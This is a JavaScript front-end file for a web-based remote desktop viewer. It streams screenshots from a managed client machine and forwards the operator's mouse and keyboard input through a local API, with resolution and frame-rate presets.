// language: JavaScript, file: public/js/rdp.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);

const clientId = Number(params.get('id'));
const hostName = params.get('host') || `client ${clientId}`;
const hostIp   = params.get('ip') || '';

$('target').textContent = `${hostName} @ ${hostIp}`;

let monitors = [];
let cfg = { monitor: 0, width: 1280, height: 720, quality: 50, fps: 10, keyboard: true, mouse: true };
let running = false;
let lastMouseSent = 0;
let framesThisSec = 0;
let lastFpsTick = Date.now();
let pollTimer = null;

const PRESETS = {
  low:    { width: 960,  height: 540, quality: 35, fps: 8  },
  med:    { width: 1280, height: 720, quality: 55, fps: 10 },
  high:   { width: 1600, height: 900, quality: 75, fps: 15 },
  native: { width: 3840, height: 2160, quality: 70, fps: 10 },
};

const img = document.createElement('img');
img.draggable = false;

img.addEventListener('load', () => {
  $('dot').classList.add('on');
  framesThisSec++;
  const now = Date.now();
  if (now - lastFpsTick >= 1000) {
    $('fps').textContent = `${framesThisSec} fps`;
    framesThisSec = 0;
    lastFpsTick = now;
  }
});
img.addEventListener('error', () => $('dot').classList.remove('on'));

async function loadMonitors() {
  try {
    const r = await fetch(`/api/clients/${clientId}/monitors`);
    if (!r.ok) return;
    monitors = await r.json();
    const sel = $('monitor');
    sel.innerHTML = '';
    if (monitors.length === 0) {
      sel.innerHTML = '<option value="0">default</option>';
      return;
    }
    monitors.forEach((m, i) => {
      const o = document.createElement('option');
      o.value = String(i);
      o.textContent = `#${i} ${m.width}×${m.height}`;
      sel.appendChild(o);
    });
    sel.value = String(cfg.monitor);
    // if preset is native, snap to this monitor's res
    applyPreset($('preset').value);
  } catch {}
}

async function start() {
  const r = await fetch(`/api/clients/${clientId}/rdp/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(cfg),
  });
  if (!r.ok) { alert('rdp start failed'); return; }
  running = true;
  const stage = $('stage');
  stage.innerHTML = '';
  stage.appendChild(img);
  loop();
}

async function stop() {
  running = false;
  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
  try { await fetch(`/api/clients/${clientId}/rdp/stop`, { method: 'POST' }); } catch {}
}

async function loop() {
  while (running) {
    const t = Date.now();
    await new Promise((resolve) => {
      const tmp = new Image();
      tmp.onload = () => { img.src = tmp.src; resolve(); };
      tmp.onerror = () => resolve();
      tmp.src = `/api/clients/${clientId}/screen?t=${t}`;
    });
    if (!running) break;
    const interval = 1000 / Math.max(cfg.fps, 1);
    await new Promise((r) => setTimeout(r, interval));
  }
}

function applyPreset(name) {
  const p = PRESETS[name];
  if (!p) return;
  if (name === 'native' && monitors[cfg.monitor]) {
    cfg.width  = monitors[cfg.monitor].width;
    cfg.height = monitors[cfg.monitor].height;
    cfg.quality = p.quality;
    cfg.fps     = p.fps;
  } else {
    Object.assign(cfg, p);
  }
}

$('preset').addEventListener('change', async (e) => {
  applyPreset(e.target.value);
  if (running) {
    await stop();
    setTimeout(start, 200);
  }
});

$('monitor').addEventListener('change', async (e) => {
  cfg.monitor = Number(e.target.value) || 0;
  applyPreset($('preset').value);
  if (running) {
    await stop();
    setTimeout(start, 200);
  }
});

$('kb').addEventListener('click', () => {
  cfg.keyboard = !cfg.keyboard;
  $('kb').classList.toggle('active', cfg.keyboard);
});

$('mouse').addEventListener('click', () => {
  cfg.mouse = !cfg.mouse;
  $('mouse').classList.toggle('active', cfg.mouse);
});

function sendInput(payload) {
  fetch(`/api/clients/${clientId}/input`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
    keepalive: true,
  }).catch(() => {});
}

function norm(e) {
  const r = img.getBoundingClientRect();
  const x = (e.clientX - r.left) / r.width;
  const y = (e.clientY - r.top)  / r.height;
  return { x: Math.max(0, Math.min(1, x)), y: Math.max(0, Math.min(1, y)) };
}

img.addEventListener('mousemove', (e) => {
  if (!cfg.mouse) return;
  const now = performance.now();
  if (now - lastMouseSent < 25) return;
  lastMouseSent = now;
  const p = norm(e);
  sendInput({ type: 'mouse_move', x: p.x, y: p.y });
});

img.addEventListener('mousedown', (e) => {
  if (!cfg.mouse) return;
  e.preventDefault();
  sendInput({ type: 'mouse_down', button: btnName(e.button) });
});

img.addEventListener('mouseup', (e) => {
  if (!cfg.mouse) return;
  e.preventDefault();
  sendInput({ type: 'mouse_up', button: btnName(e.button) });
});

img.addEventListener('contextmenu', (e) => e.preventDefault());

img.addEventListener('wheel', (e) => {
  if (!cfg.mouse) return;
  e.preventDefault();
  sendInput({ type: 'mouse_wheel', dy: Math.sign(e.deltaY) });
}, { passive: false });

document.addEventListener('keydown', (e) => {
  if (!cfg.keyboard) return;
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
  e.preventDefault();
  sendInput({ type: 'key', code: e.code, key: e.key, down: true });
});

document.addEventListener('keyup', (e) => {
  if (!cfg.keyboard) return;
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
  e.preventDefault();
  sendInput({ type: 'key', code: e.code, key: e.key, down: false });
});

function btnName(b) { return b === 2 ? 'right' : b === 1 ? 'middle' : 'left'; }

$('stop').addEventListener('click', async () => {
  await stop();
  window.close();
});

window.addEventListener('beforeunload', () => { stop(); });

loadMonitors().then(start);